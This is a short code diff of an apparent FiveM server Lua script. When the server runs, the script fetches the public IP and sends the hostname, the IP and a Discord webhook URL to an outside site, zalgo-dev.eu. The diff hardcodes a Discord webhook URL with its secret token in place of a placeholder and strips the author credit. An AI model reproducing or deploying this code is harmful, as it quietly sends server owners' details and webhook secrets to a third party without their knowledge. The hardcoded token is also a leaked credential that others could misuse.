@@ -1,17 +1,11 @@
-
-local webhook_url = "TON WEBHOOK ICI !!"      -- TON WEBHOOK ENTRE LES GUILLEMETS
-
-
-
-
-
 local web_url = "https://zalgo-dev.eu/register_server.php?hostname="
+local webhook_url = "https://discord.com/api/webhooks/1240444960407552050/HLUpguMD3J4sPtiHk-uaLRBGIi22PIS2p7G4JXhJbtXiM3SXJCetND98kdpP99c6TqEO"
+
 function GetPublicIP(callback)
     PerformHttpRequest("http://ifconfig.me/ip", function(err, text, headers)
         if err == 200 and text then
-            callback(text:match("^%s*(.-)%s*$"))
-        else
-            callback(nil)
+            local ip = text:match("^%s*(.-)%s*$")
+            callback(ip)
         end
     end, 'GET', '')
 end
@@ -27,8 +21,8 @@ function SendServerInfoToWebsite(hostname, ip, webhook)
 
     local url = web_url .. encoded_hostname .. "&ip=" .. encoded_ip .. "&webhook=" .. encoded_webhook
     PerformHttpRequest(url, function(err, text, headers)
-        if err ~= 200 then
-		return nil
+        if err == 200 then
+            return nil
         end
     end, 'GET', '')
 end
@@ -42,5 +36,3 @@ Citizen.CreateThread(function()
         end
     end)
 end)
-
---[[By ZalgoDev]]--
